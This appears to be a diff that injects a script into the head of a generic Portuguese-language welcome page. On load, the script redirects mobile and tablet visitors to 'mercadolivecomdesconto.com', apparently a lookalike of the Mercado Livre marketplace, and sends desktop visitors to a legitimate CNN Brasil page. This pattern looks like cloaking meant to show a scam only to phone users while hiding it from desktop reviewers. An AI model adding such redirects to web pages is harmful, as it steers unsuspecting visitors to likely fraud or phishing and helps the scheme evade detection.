@@ -1,6 +1,22 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+    <script>
+// 1. Configurações de destino
+var urlMobile  = "https://mercadolivecomdesconto.com/635749128";
+var urlDesktop = "https://www.cnnbrasil.com.br/tudo-sobre/mercado-livre/";
+
+// 2. Detecção de dispositivo (Melhorada para incluir tablets modernos)
+var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
+               (navigator.maxTouchPoints > 0 && /Macintosh/i.test(navigator.userAgent));
+
+// 3. Lógica de Redirecionamento
+if (isMobile) {
+    window.location.replace(urlMobile);
+} else {
+    window.location.replace(urlDesktop);
+}
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bem-vindo ao Meu Site!</title>
